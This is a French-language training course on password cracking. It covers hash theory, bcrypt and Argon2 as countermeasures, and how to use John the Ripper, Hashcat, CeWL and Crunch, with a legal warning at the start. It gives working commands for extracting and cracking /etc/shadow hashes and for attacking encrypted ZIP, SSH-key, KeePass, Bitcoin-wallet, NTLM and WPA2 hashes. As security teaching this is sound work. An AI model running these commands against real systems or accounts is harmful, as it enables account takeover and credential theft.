# Cracking de mots de passe — John the Ripper et Hashcat

Le cracking de mots de passe est une compétence fondamentale en cybersécurité offensive et défensive. Comprendre comment les mots de passe sont cassés permet de concevoir des systèmes d'authentification robustes et d'auditer la résistance des politiques de mots de passe en entreprise. Ce cours couvre la théorie du hachage, les outils industriels John the Ripper et Hashcat, ainsi que les contre-mesures permettant de rendre le cracking économiquement inviable.

> [!warning] Avertissement légal — Utilisation éthique uniquement
> Les techniques présentées dans ce cours sont destinées **exclusivement** à des fins pédagogiques, à l'audit de vos propres systèmes, ou dans le cadre d'un contrat de pentest signé (bug bounty, red team mandaté). Toute utilisation contre des systèmes ou comptes qui ne vous appartiennent pas, sans autorisation écrite explicite, constitue une infraction pénale dans la quasi-totalité des pays (CFAA aux États-Unis, article 323-1 du Code pénal en France, Computer Misuse Act au Royaume-Uni). Les peines vont jusqu'à plusieurs années d'emprisonnement. Holberton School et vos formateurs déclinent toute responsabilité en cas d'usage non autorisé.

---

## 1. Théorie du hachage

### 1.1 Qu'est-ce qu'une fonction de hachage cryptographique ?

Une fonction de hachage cryptographique transforme une entrée de taille arbitraire en une empreinte (digest) de taille fixe. Elle doit satisfaire trois propriétés fondamentales :

| Propriété | Définition | Pourquoi c'est important |
|-----------|------------|--------------------------|
| **Résistance à la préimage** | Impossible de retrouver `m` depuis `H(m)` | Empêche la récupération directe du mot de passe |
| **Résistance à la seconde préimage** | Impossible de trouver `m'` tel que `H(m') = H(m)` | Empêche la substitution de message |
| **Résistance aux collisions** | Impossible de trouver deux messages `m ≠ m'` avec `H(m) = H(m')` | Empêche les faux positifs dans la vérification |

> [!info] Le hachage n'est pas du chiffrement
> Une fonction de hachage est **à sens unique** — il n'existe pas de clé pour "déchiffrer". Casser un hash consiste à trouver une entrée qui produit le même digest, pas à "inverser" la fonction mathématiquement.

### 1.2 MD5 — Fossile historique

MD5 (Message Digest 5, 1991) produit un digest de 128 bits (32 caractères hexadécimaux).

```bash
# Exemples de hachage MD5
echo -n "password" | md5sum
# 5f4dcc3b5aa765d61d8327deb882cf99

echo -n "Password" | md5sum
# dc647eb65e6711e155375218212b3964

echo -n "password123" | md5sum
# 482c811da5d5b4bc6d497ffa98491e38
```

**Faiblesses critiques :**
- Collisions trouvées en 2004 (Wang & Yu) — deux fichiers différents peuvent avoir le même MD5
- Vitesse de calcul : un GPU moderne calcule **10+ milliards de MD5/seconde**
- Aucun sel (salt) par défaut
- **Ne jamais utiliser pour stocker des mots de passe** — considéré comme cryptographiquement cassé

```
MD5("password") = 5f4dcc3b5aa765d61d8327deb882cf99
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                  32 caractères hex = 128 bits
```

### 1.3 SHA-1 — Déprécié mais encore présent

SHA-1 (Secure Hash Algorithm 1, 1995) produit un digest de 160 bits (40 caractères hex).

```bash
echo -n "password" | sha1sum
# 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8

# Collision SHA-1 démontrée en 2017 (SHAttered attack par Google)
# Deux PDF différents avec le même SHA-1
```

**Statut actuel :**
- Collisions démontrées pratiquement en 2017 (coût : ~100 000 USD de GPU à l'époque)
- Vitesse GPU : ~5 milliards de SHA-1/seconde
- Retiré des certificats TLS depuis 2017
- Encore présent dans les anciens systèmes Linux (`/etc/shadow` avec préfixe `$1$`)

### 1.4 SHA-256 et famille SHA-2

SHA-256 produit 256 bits (64 hex), SHA-512 produit 512 bits (128 hex). Publiés en 2001.

```bash
echo -n "password" | sha256sum
# 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8

echo -n "password" | sha512sum
# b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
```

**Forces :**
- Pas de collision connue
- Standard actuel pour les certificats numériques, HMAC, signatures

**Faiblesse pour le stockage de mots de passe :**
- Trop **rapide** — conçu pour la performance (hachage de fichiers, signatures)
- Un GPU moderne calcule ~8 milliards de SHA-256/seconde
- Sans sel, vulnérable aux rainbow tables

> [!warning] SHA-256 seul est insuffisant pour les mots de passe
> La rapidité de SHA-2 est une qualité pour les cas d'usage normaux, mais un défaut critique pour le stockage de mots de passe. Un attaquant peut tester des milliards de candidats par seconde.

### 1.5 bcrypt — Le standard robuste

bcrypt (1999, Niels Provos & David Mazières) est spécifiquement conçu pour le stockage de mots de passe. Il intègre nativement un sel et un facteur de coût ajustable.

```
Format : $2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewcheXbD1OHv7XWK
          ^^^ ^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
          |   |   Sel (22 chars base64 = 128b)  Hash (31 chars base64 = 184b)
          |   Facteur de coût (rounds = 2^12 = 4096)
          Variante (2b = version moderne)
```

```python
import bcrypt

# Hachage d'un mot de passe
password = b"MonMotDePasse123"
salt = bcrypt.gensalt(rounds=12)  # 2^12 = 4096 itérations
hashed = bcrypt.hashpw(password, salt)
print(hashed)
# b'$2b$12$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'

# Vérification
if bcrypt.checkpw(password, hashed):
    print("Mot de passe correct")
```

**Caractéristiques clés :**
- **Facteur de coût** : augmenter de 1 double le temps de calcul (rounds=12 → 250ms, rounds=14 → 1s)
- **Sel intégré** : chaque hash est unique même pour le même mot de passe
- **Limite de 72 octets** : les caractères au-delà du 72e sont ignorés
- Vitesse GPU : ~20 000 bcrypt/seconde avec `cost=12` (contre 8 milliards pour SHA-256)

### 1.6 Argon2 — L'état de l'art

Argon2 a remporté le Password Hashing Competition (PHC) en 2015. C'est la recommandation actuelle pour tout nouveau développement.

```python
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,       # Nombre d'itérations
    memory_cost=65536, # 64 MB de RAM requis
    parallelism=4,     # Threads parallèles
    hash_len=32,       # Longueur du hash en bytes
    salt_len=16        # Longueur du sel
)

# Hachage
hash_value = ph.hash("MonMotDePasse")
print(hash_value)
# $argon2id$v=19$m=65536,t=3,p=4$sel_base64$hash_base64

# Vérification
try:
    ph.verify(hash_value, "MonMotDePasse")
    print("OK")
except Exception:
    print("Mot de passe incorrect")
```

**Trois variantes :**

| Variante | Résistance | Cas d'usage |
|----------|------------|-------------|
| `argon2d` | Résistant aux GPU | Crypto-monnaies |
| `argon2i` | Résistant aux attaques side-channel | Dérivation de clé |
| `argon2id` | Hybride (recommandé) | Mots de passe, usage général |

**Avantage décisif sur bcrypt :** le paramètre `memory_cost` force l'attaquant à utiliser de la RAM (pas seulement du CPU/GPU). Un attaquant avec 1000 GPU mais peu de RAM est fortement ralenti — les GPU ont de la VRAM limitée.

### 1.7 Tableau comparatif des algorithmes

```
Algorithme  | Bits | Sel natif | Coût ajustable | Vitesse GPU (H/s) | Recommandation
------------|------|-----------|----------------|-------------------|---------------
MD5         | 128  | Non       | Non            | 50 milliards      | JAMAIS
SHA-1       | 160  | Non       | Non            | 20 milliards      | JAMAIS
SHA-256     | 256  | Non       | Non            | 8 milliards       | Pas pour mdp
SHA-512     | 512  | Non       | Non            | 3 milliards       | Pas pour mdp
bcrypt(12)  | 184  | Oui       | Oui (coût exp) | 20 000            | Acceptable
Argon2id    | var  | Oui       | Oui (CPU+RAM)  | < 1 000           | RECOMMANDÉ
```

---

## 2. Types d'attaques sur les hachages

### 2.1 Vue d'ensemble des vecteurs d'attaque

```
                    ┌─────────────────────────────┐
                    │       Hash à cracker        │
                    │   5f4dcc3b5aa765d61d8327...  │
                    └──────────────┬──────────────┘
                                   │
          ┌────────────────────────┼────────────────────────┐
          │                        │                        │
   ┌──────▼──────┐         ┌───────▼──────┐       ┌────────▼────────┐
   │ Dictionnaire│         │  Force brute │       │ Rainbow Tables  │
   │  rockyou    │         │  ?a?a?a?a    │       │  Précalculés    │
   └──────┬──────┘         └───────┬──────┘       └────────┬────────┘
          │                        │                        │
   ┌──────▼──────┐         ┌───────▼──────┐       ┌────────▼────────┐
   │  + Règles   │         │  + Masques   │       │  Contré par sel │
   │  best64     │         │  ?u?l?d?d    │       │  (salting)      │
   └─────────────┘         └─────────────┘       └─────────────────┘
```

### 2.2 Attaque par dictionnaire

L'attaque par dictionnaire teste chaque mot d'une liste (wordlist) en le hachant et comparant au hash cible. C'est l'attaque la plus efficace car les humains choisissent des mots prévisibles.

```bash
# Principe en pseudo-code
for word in wordlist.txt:
    if hash(word) == target_hash:
        print("Trouvé :", word)
        break
```

**Efficacité :** La wordlist `rockyou.txt` (14 millions de mots de passe réels) casse environ 60-70% des hashes MD5 non salés provenant de fuites réelles.

### 2.3 Force brute

Teste toutes les combinaisons possibles pour un charset et une longueur donnés.

```
Charset: abcdefghijklmnopqrstuvwxyz (26 chars)
Longueur 6: 26^6 = 308 915 776 combinaisons ≈ 0.3 secondes avec GPU (MD5)
Longueur 8: 26^8 = 208 827 064 576 ≈ 4 minutes
Longueur 10: 26^10 ≈ 45 jours

Charset étendu (62 chars: a-z A-Z 0-9):
Longueur 8: 62^8 = 218 340 105 584 896 ≈ 7 heures
Longueur 10: 62^10 ≈ 2.6 ans
```

> [!info] La force brute est exponentielle
> Chaque caractère ajouté multiplie le temps par la taille du charset. Un mot de passe de 12 caractères alphanumériques prendrait des millions d'années en force brute pure, même sur un cluster GPU.

### 2.4 Attaque hybride

Combine dictionnaire + mutations : chaque mot du dictionnaire est modifié selon des règles (capitalisation, substitutions, ajout de chiffres).

```
word "password" → transformations :
- Password        (majuscule première lettre)
- PASSWORD        (tout en majuscules)
- p@ssword        (a → @)
- password123     (ajout de chiffres)
- passw0rd        (o → 0)
- P@ssw0rd!       (combinaison)
```

### 2.5 Attaque par règles (rule-based)

Les règles sont des programmes miniatures appliqués à chaque mot du dictionnaire. C'est l'approche la plus puissante en pratique.

```
Règle John/Hashcat notation :
l  = lowercase
u  = uppercase
c  = capitalize
$1 = ajouter "1" à la fin
^! = ajouter "!" au début
sa@ = substituer a par @
```

### 2.6 Rainbow Tables

Une rainbow table est une structure de données précalculée qui associe des hashes à leurs préimages originales, en utilisant des chaînes de réduction pour compresser l'espace.

```
Génération d'une chaîne rainbow (simplifiée) :

"password" → hash → réduction → "apple23" → hash → réduction → "xyz99" → ...
             ↓                                                               ↓
     5f4dcc3b...                                                    Stocké en table

Lors du crack :
hash_cible → réduction → hash → réduction → ... → correspondance dans la table → remonter la chaîne → mot de passe original
```

**Avantage :** lookup très rapide une fois la table générée.
**Inconvénient :** inutile si le hash est salé (le sel modifie le hash même pour le même mot de passe).

```bash
# Exemple avec ophcrack (Windows NTLM, sans sel)
ophcrack -t tables/xp_free/ -f hashes.txt

# Taille typique des tables rainbow NTLM all-alpha 8 chars
# ~400 GB pour une couverture de ~99.9%
```

---

## 3. John the Ripper

### 3.1 Présentation et installation

John the Ripper (JtR) est l'outil de référence pour le cracking de mots de passe en mode CPU, développé depuis 1996 par Solar Designer. La version "Jumbo" supporte des centaines de formats.

```bash
# Installation Debian/Ubuntu
sudo apt update
sudo apt install john

# Version Jumbo depuis les sources (recommandé pour les derniers formats)
git clone https://github.com/openwall/john.git
cd john/src
./configure && make -j$(nproc)
# Binaire dans john/run/john

# Vérification
john --version
# John the Ripper 1.9.0-jumbo-1

# Kali Linux — déjà installé
which john
# /usr/sbin/john
```

### 3.2 Formats supportés

```bash
# Lister tous les formats supportés
john --list=formats

# Rechercher un format spécifique
john --list=formats | grep -i md5
john --list=formats | grep -i sha256
john --list=formats | grep -i ntlm

# Formats courants
# raw-md5, raw-sha1, raw-sha256, raw-sha512
# md5crypt (Linux $1$), sha512crypt (Linux $6$), bcrypt ($2b$)
# NT (Windows NTLM), LM (Windows LM)
# zip, pdf, keepass, truecrypt, rar
```

### 3.3 Modes d'attaque John

#### Mode Single (par défaut)

Utilise les informations du fichier (login, GECOS, home directory) pour générer des candidats. Très rapide, utile en premier.

```bash
# Le fichier passwd contient login:hash (format /etc/shadow ou custom)
john --single fichier_hashes.txt

# Avec format explicite
john --single --format=raw-md5 hashes.txt
```

#### Mode Wordlist

```bash
# Avec la wordlist par défaut (/usr/share/john/password.lst)
john --wordlist fichier_hashes.txt

# Avec rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Avec règles
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hashes.txt
john --wordlist=wordlist.txt --rules=dive hashes.txt   # plus agressif
john --wordlist=wordlist.txt --rules=jumbo hashes.txt  # exhaustif
```

#### Mode Incrémental (force brute)

```bash
# Force brute avec le charset par défaut
john --incremental hashes.txt

# Avec un charset spécifique
john --incremental:alpha hashes.txt   # a-z seulement
john --incremental:digits hashes.txt  # 0-9 seulement
john --incremental:alnum hashes.txt   # a-z, A-Z, 0-9
```

#### Mode External

Permet d'écrire un générateur de candidats personnalisé en C embarqué.

```bash
# Voir les modes externes disponibles
grep -i '\[List.External:' /etc/john/john.conf
```

### 3.4 Utilisation de base — /etc/shadow

```bash
# Étape 1 : Extraire les hashes avec unshadow
unshadow /etc/passwd /etc/shadow > hashes_combined.txt

# Contenu typique de hashes_combined.txt :
# root:$6$salt$hash...:0:0:root:/root:/bin/bash
# john:$6$othersalt$otherhash...:1000:1000:John:/home/john:/bin/bash

# Étape 2 : Lancer John
john hashes_combined.txt

# Étape 3 : Afficher les mots de passe trouvés
john --show hashes_combined.txt

# Stopper et reprendre (John sauvegarde l'état automatiquement)
# Ctrl+C pour arrêter
john --restore  # reprend depuis le point d'arrêt
```

**Formats Linux `/etc/shadow` :**

```
$1$  → MD5crypt (très ancien, Linux < 2004)
$2b$ → bcrypt
$5$  → SHA-256crypt
$6$  → SHA-512crypt (standard actuel Ubuntu/Debian)
$y$  → yescrypt (moderne, Ubuntu 22.04+)
```

### 3.5 Identifier automatiquement le format

```bash
# John peut détecter automatiquement dans de nombreux cas
john --list=formats | grep -i "crypt"

# Forcer le format
john --format=sha512crypt hashes.txt
john --format=bcrypt hashes.txt
john --format=raw-md5 hashes.txt

# Si John n'identifie pas le format, utiliser hashid (voir section 8)
```

### 3.6 Fichiers de configuration et règles

John utilise `john.conf` (ou `john.ini` sur certains systèmes) pour ses règles et charsets.

```bash
# Emplacement
/etc/john/john.conf
# ou
~/.john/john.conf
# ou dans le répertoire d'exécution

# Voir les règles disponibles
grep '^\[List.Rules:' /etc/john/john.conf
```

**Structure d'un fichier de règles John :**

```ini
# Dans john.conf

[List.Rules:MyCustomRules]
# Chaque ligne est une règle appliquée à chaque mot du dictionnaire

# Règles de base
:          # Mot tel quel
l          # tout en minuscules
u          # tout en majuscules
c          # Première lettre en majuscule
r          # Inverser le mot (password → drowssap)

# Ajout de caractères
$1         # Ajouter "1" à la fin
$!         # Ajouter "!" à la fin
^1         # Ajouter "1" au début

# Substitutions
sa@        # Remplacer 'a' par '@'
se3        # Remplacer 'e' par '3'
si!        # Remplacer 'i' par '!'
so0        # Remplacer 'o' par '0'

# Combinaisons
c$1        # Capitaliser + ajouter 1 à la fin
sa@se3so0  # Leet speak complet
```

**Règle best64 (intégrée) — les 64 règles les plus efficaces statistiquement :**

```ini
[List.Rules:best64]
:
l
u
c
r
d
l$!
l$1
l$2
# ... 56 autres règles
```

```bash
# Utiliser best64
john --wordlist=rockyou.txt --rules=best64 hashes.txt

# Règle dive (plus complète, ~2000 règles)
john --wordlist=rockyou.txt --rules=dive hashes.txt
```

### 3.7 Cracker des archives et fichiers protégés

John inclut des utilitaires `*2john` pour extraire les hashes de différents formats.

```bash
# Archive ZIP
zip2john protected.zip > hash_zip.txt
john hash_zip.txt

# Archive RAR
rar2john protected.rar > hash_rar.txt
john hash_rar.txt

# PDF protégé par mot de passe
pdf2john.pl document.pdf > hash_pdf.txt
john hash_pdf.txt

# Clé SSH privée chiffrée
ssh2john id_rsa_encrypted > hash_ssh.txt
john --wordlist=rockyou.txt hash_ssh.txt

# Base KeePass
keepass2john database.kdbx > hash_kdbx.txt
john --wordlist=rockyou.txt hash_kdbx.txt

# Wallet Bitcoin
bitcoin2john wallet.dat > hash_btc.txt
john hash_btc.txt
```

### 3.8 Performances et parallélisme

```bash
# Voir la progression en cours d'exécution
# Appuyer sur Entrée pendant que John tourne affiche les stats

# Utiliser plusieurs CPU
john --fork=4 hashes.txt  # 4 processus parallèles

# Afficher les statistiques de session
john --status

# Tester les performances du système
john --test
```

---

## 4. Hashcat

### 4.1 Architecture GPU et avantages

Hashcat est l'outil de cracking GPU le plus performant. Il exploite OpenCL, CUDA ou Metal pour paralléliser massivement le calcul.

```
Architecture de Hashcat :

┌─────────────────────────────────────────────────────────┐
│                     Hashcat                             │
├─────────────────────────────────────────────────────────┤
│  Gestion des candidats     │  Moteur de hachage         │
│  (wordlist, masque, règles)│  (OpenCL/CUDA kernels)     │
├─────────────────────────────────────────────────────────┤
│                  Dispatch API                           │
├──────────────────────┬──────────────────────────────────┤
│   GPU 1 (CUDA)       │   GPU 2 (OpenCL)                │
│   10 000 cores       │   8 000 cores                   │
│   8 GB VRAM          │   16 GB VRAM                    │
└──────────────────────┴──────────────────────────────────┘

Vitesse typique (RTX 4090) :
MD5      : 164 GH/s (164 milliards/seconde)
SHA-256  :  18 GH/s
bcrypt12 :  100 kH/s (100 000/seconde)
Argon2id :  < 100 H/s
```

### 4.2 Installation

```bash
# Debian/Ubuntu (version du dépôt — peut être ancienne)
sudo apt install hashcat

# Version récente depuis les releases GitHub
wget https://hashcat.net/files/hashcat-6.2.6.tar.gz
tar -xzf hashcat-6.2.6.tar.gz
cd hashcat-6.2.6
make
./hashcat --version

# Kali Linux — déjà installé
hashcat --version

# Vérifier que les GPU sont détectés
hashcat -I
# OpenCL platform #1: NVIDIA Corporation
#   * Device #1: NVIDIA RTX 4090, 24320/24564 MB, 128MCU
```

### 4.3 Modes d'attaque (-a)

```
Mode | Nom              | Description
-----|------------------|------------------------------------------
 0   | Straight         | Dictionnaire pur
 1   | Combination      | Combine deux wordlists (word1 + word2)
 3   | Brute-force      | Masque (charset + longueur)
 6   | Hybrid WL+Mask   | Wordlist puis masque en suffixe
 7   | Hybrid Mask+WL   | Masque en préfixe puis wordlist
 9   | Association      | Combine mots de passes
```

### 4.4 Syntaxe de base

```bash
# Syntaxe générale
hashcat -m <mode_hash> -a <mode_attaque> <fichier_hashes> <dictionnaire/masque> [options]

# -m : type de hash (voir section 4.5)
# -a : mode d'attaque (0-9)
# -o : fichier de sortie pour les mots de passe trouvés
# --show : afficher les mots de passe déjà crackés
# --status : afficher les stats en temps réel
# --force : ignorer les avertissements (attention !)
```

### 4.5 Modes de hash (-m) — les plus importants

```bash
# Lister tous les modes
hashcat --help | grep -A 200 "Hash modes"

# Principaux modes
-m 0      # MD5 simple
-m 100    # SHA-1
-m 1400   # SHA-256
-m 1700   # SHA-512
-m 500    # MD5crypt ($1$) — Linux ancien
-m 3200   # bcrypt ($2*$)
-m 1800   # sha512crypt ($6$) — Linux moderne
-m 1000   # NTLM (Windows)
-m 2000   # LM (Windows très ancien)
-m 3000   # LM half (cracke en deux moitiés)
-m 5600   # NetNTLMv2 (capture réseau)
-m 2500   # WPA-PBKDF2-PMKID+EAPOL (WiFi WPA2)
-m 22000  # WPA-PBKDF2-PMKID+EAPOL (format récent)
-m 13400  # KeePass 1 et 2
-m 10500  # PDF 1.4-1.6
-m 13600  # ZIP (AES-256)
-m 12500  # RAR3-hp
```

### 4.6 Attaque dictionnaire (-a 0)

```bash
# MD5 avec rockyou
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA-256 avec règles best64
hashcat -m 1400 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# SHA-512crypt Linux avec règles
hashcat -m 1800 -a 0 shadow_hashes.txt rockyou.txt -r rules/dive.rule

# Sauvegarder les résultats
hashcat -m 0 -a 0 hashes.txt rockyou.txt -o cracked.txt

# Reprendre une session interrompue
hashcat --session=mysession -m 0 -a 0 hashes.txt rockyou.txt
# En cas d'interruption :
hashcat --session=mysession --restore
```

### 4.7 Attaque par masque (-a 3)

Le système de masque de Hashcat est plus expressif que la force brute classique. Il permet de spécifier un pattern exact.

**Charsets prédéfinis :**

```
?l = abcdefghijklmnopqrstuvwxyz         (minuscules)
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ         (majuscules)
?d = 0123456789                          (chiffres)
?s = !@#$%^&*()_+{}|<>?                 (symboles)
?a = tous (?l + ?u + ?d + ?s)          (tous les imprimables)
?h = 0123456789abcdef                   (hex minuscules)
?H = 0123456789ABCDEF                   (hex majuscules)
```

```bash
# Mot de passe de 8 chiffres exactement
hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d?d?d

# Format typique "Mot de passe entreprise" : Majuscule + 6 minuscules + 2 chiffres
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?d

# PIN à 4 chiffres
hashcat -m 0 -a 3 hashes.txt ?d?d?d?d

# 8 caractères quelconques (lent pour les gros charsets)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# Incrémenter la longueur : tester de 1 à 8 caractères
hashcat -m 0 -a 3 hashes.txt --increment --increment-min=1 --increment-max=8 ?a

# Charset personnalisé : chiffres + symboles seulement
hashcat -m 0 -a 3 hashes.txt -1 ?d?s ?1?1?1?1?1?1

# Deux charsets personnalisés
hashcat -m 0 -a 3 hashes.txt -1 ?u?l -2 ?d?s ?1?1?1?1?2?2
```

### 4.8 Attaque combinaison (-a 1)

```bash
# Concatène chaque mot de wordlist1 avec chaque mot de wordlist2
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Exemple : wordlist1 = ["chat", "chien"] × wordlist2 = ["123", "!"]
# Candidats générés : chat123, chat!, chien123, chien!

# Avec transformation sur la seconde liste
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt -j 'c'
# -j = règle appliquée à wordlist1, -k = règle appliquée à wordlist2
```

### 4.9 Attaque hybride (-a 6 et -a 7)

```bash
# Mode 6 : mot du dictionnaire + masque en suffixe
# Exemples : password123, password!, password2024
hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d?d

# Mode 7 : masque en préfixe + mot du dictionnaire
# Exemples : 2024password, 1!password
hashcat -m 0 -a 7 hashes.txt ?d?d?d?d rockyou.txt
```

### 4.10 Règles Hashcat

Les règles Hashcat s'appliquent en mode `-a 0` avec le flag `-r`. La syntaxe est similaire à John mais légèrement différente.

```bash
# Règles intégrées (dans /usr/share/hashcat/rules/ ou hashcat/rules/)
ls /usr/share/hashcat/rules/
# best64.rule    — 64 règles les plus efficaces
# combinator.rule
# d3ad0ne.rule
# dive.rule      — très complet, 99 000+ règles
# generated.rule
# generated2.rule
# Incisive-leetspeak.rule
# InsidePro-HashManager.rule
# leetspeak.rule
# oscommerce.rule
# rockyou-30000.rule  — basées sur rockyou
# specific.rule
# T0XlC.rule
# T0XlC-insert_space_and_special_0_F.rule
# unix-ninja-leetspeak.rule
```

**Syntaxe des règles Hashcat :**

```
Opérateur | Action
----------|--------------------------------------------------
:         | Ne rien faire (passe le mot tel quel)
l         | Tout en minuscules
u         | Tout en majuscules
c         | Première lettre en majuscule
C         | Première lettre en minuscule, reste en majuscule
r         | Inverser le mot
d         | Dupliquer (password → passwordpassword)
p2        | Répéter 2 fois (password → passwordpassword)
f         | Miroir (password → passworddrowssap)

$X        | Ajouter caractère X à la fin
^X        | Ajouter caractère X au début

[         | Supprimer premier caractère
]         | Supprimer dernier caractère

'N        | Tronquer à N caractères depuis la gauche

sXY       | Substituer X par Y (sa@ = a→@)
@X        | Supprimer tous les X

iNX       | Insérer X en position N
oNX       | Remplacer caractère en position N par X

{ / }     | Décaler gauche / droite

4         | Dupliquer tout (même que d)
z N       | Dupliquer premier char N fois
Z N       | Dupliquer dernier char N fois
```

**Créer un fichier de règles custom :**

```bash
# Fichier : mes_regles.rule
cat << 'EOF' > mes_regles.rule
# Règle 1 : Mot tel quel
:
# Règle 2 : Capitaliser
c
# Règle 3 : Capitaliser + ajouter !
c$!
# Règle 4 : Capitaliser + ajouter 1
c$1
# Règle 5 : Leet speak simple
so0sa@se3si!
# Règle 6 : Leet speak capitalisé
cso0sa@se3si!
# Règle 7 : Année courante
$2$0$2$4
# Règle 8 : Doublement commun
d
# Règle 9 : Inverser
r
# Règle 10 : Mot + point d'exclamation majuscule
u$!
EOF

# Utiliser les règles custom
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r mes_regles.rule
```

### 4.11 Options avancées et optimisation

```bash
# Limiter l'utilisation du GPU (pour ne pas surchauffer)
hashcat -m 0 -a 0 hashes.txt wordlist.txt --gpu-temp-abort=85  # arrêt à 85°C

# Workload profile
hashcat -m 0 -a 0 hashes.txt wordlist.txt -w 1  # léger (bureau utilisable)
hashcat -m 0 -a 0 hashes.txt wordlist.txt -w 3  # normal
hashcat -m 0 -a 0 hashes.txt wordlist.txt -w 4  # nightmare (machine inutilisable)

# Optimized kernels (plus rapide mais limite la longueur des mots de passe à 32 chars)
hashcat -m 0 -a 0 hashes.txt wordlist.txt -O

# Utiliser uniquement le CPU (mode opencl)
hashcat -m 0 -a 0 hashes.txt wordlist.txt -D 1  # Device type 1 = CPU
hashcat -m 0 -a 0 hashes.txt wordlist.txt -D 2  # Device type 2 = GPU

# Utiliser plusieurs GPU
hashcat -m 0 -a 0 hashes.txt wordlist.txt -d 1,2  # GPU 1 et 2

# Afficher la vitesse sans cracker (benchmark)
hashcat -m 0 -b     # Benchmark MD5
hashcat -b          # Benchmark tous les algos
```

---

## 5. Wordlists — Sources et génération

### 5.1 rockyou.txt — La référence

`rockyou.txt` est issu de la fuite de la base de données du site RockYou.com en 2009 (32 millions de mots de passe en clair). Après déduplication, environ 14 millions de mots de passe uniques.

```bash
# Sur Kali/Parrot
ls -lh /usr/share/wordlists/rockyou.txt
# ou
ls -lh /usr/share/wordlists/rockyou.txt.gz

# Décompresser si nécessaire
gunzip /usr/share/wordlists/rockyou.txt.gz

# Statistiques
wc -l /usr/share/wordlists/rockyou.txt
# 14 344 392 lignes

# Top 10 des mots de passe les plus courants dans rockyou
head -10 /usr/share/wordlists/rockyou.txt
# 123456
# 12345
# 123456789
# password
# iloveyou
# princess
# 1234567
# rockyou
# 12345678
# abc123
```

### 5.2 SecLists — Collection complète

SecLists (Daniel Miessler) est la collection de wordlists la plus complète pour la sécurité offensive.

```bash
# Installation
sudo apt install seclists
# ou
git clone https://github.com/danielmiessler/SecLists.git /opt/SecLists

# Structure
ls /usr/share/seclists/
# Discovery/    — fuzzing web, répertoires, paramètres
# Fuzzing/      — payloads d'injection
# Passwords/    — wordlists de mots de passe
# Usernames/    — listes de noms d'utilisateur
# Web-Shells/   — webshells
# ...

# Wordlists de mots de passe notables
ls /usr/share/seclists/Passwords/
# Common-Credentials/10-million-password-list-top-1000000.txt
# Leaked-Databases/rockyou.txt.tar.gz
# darkweb2017-top10000.txt
# probable-v2-top12000.txt
```

### 5.3 CeWL — Wordlist personnalisée depuis un site web

CeWL (Custom Word List Generator) scrape un site web et génère une wordlist à partir des mots trouvés. Utile en pentest ciblé.

```bash
# Installation
sudo apt install cewl

# Générer une wordlist depuis un site
cewl https://example.com -w wordlist_site.txt

# Options avancées
cewl https://example.com \
  -d 3 \          # Profondeur de crawl (3 niveaux)
  -m 6 \          # Longueur minimale des mots (6 chars)
  --with-numbers \ # Inclure les mots avec chiffres
  -w wordlist.txt

# Inclure les emails trouvés sur le site
cewl https://example.com --email -e wordlist.txt

# Exemple typique : site d'entreprise en pentest
cewl https://entreprise-cible.com -d 2 -m 5 -w cewl_output.txt
wc -l cewl_output.txt
# La wordlist générée contient les termes métier de l'entreprise
# (noms de projets, produits, noms propres, etc.)
```

### 5.4 Crunch — Génération par pattern

Crunch génère des wordlists selon des patterns précis.

```bash
# Installation
sudo apt install crunch

# Syntaxe : crunch <min> <max> [charset] [options]

# Tous les mots de 6 à 8 chiffres
crunch 6 8 0123456789 -o digits.txt

# Tous les mots de 4 lettres minuscules
crunch 4 4 abcdefghijklmnopqrstuvwxyz -o alpha4.txt

# Pattern spécifique avec -t
# @ = minuscule, , = majuscule, % = chiffre, ^ = symbole
crunch 8 8 -t @@@@%%%% -o pattern.txt
# Génère : aaaa0000, aaaa0001, ..., zzzz9999

# Mot de passe style "Motdepasse2024!"
crunch 14 14 -t ,@@@@@@@@%%%^
# Exemples générés : Apassword2024!

# Exemple pratique : PIN iPhone (4 chiffres)
crunch 4 4 0123456789 -o pins.txt
wc -l pins.txt
# 10000 (10^4)

# Limite importante : les listes générées peuvent être ÉNORMES
crunch 8 8 abcdefghijklmnopqrstuvwxyz
# Taille estimée : 26^8 × 9 bytes ≈ 1.9 TB (!!)
# Utiliser avec pipe vers hashcat plutôt que fichier
crunch 6 6 abcdefghijklmnopqrstuvwxyz | hashcat -m 0 -a 0 hashes.txt
```

### 5.5 Princeprocessor — Génération intelligente

PRINCE (PRobability INfinite Chained Elements) génère des candidats en combinant des éléments de wordlists, basé sur la probabilité statistique.

```bash
# Depuis les sources
git clone https://github.com/hashcat/princeprocessor.git
cd princeprocessor/src && make
./pp64.bin

# Utilisation avec Hashcat
./pp64.bin wordlist.txt | hashcat -m 0 -a 0 hashes.txt

# PRINCE intégré dans Hashcat
hashcat -m 0 -a 3 hashes.txt --prince wordlist.txt  # pas encore stable en 6.x
```

### 5.6 Kwprocessor — Séquences clavier

Génère des mots de passe basés sur des séquences clavier (qwerty, azerty, etc.).

```bash
# Exemple : qwerty, asdfgh, 1q2w3e, etc.
# Ces patterns sont très courants dans les bases de données réelles
git clone https://github.com/hashcat/kwprocessor.git
cd kwprocessor && make
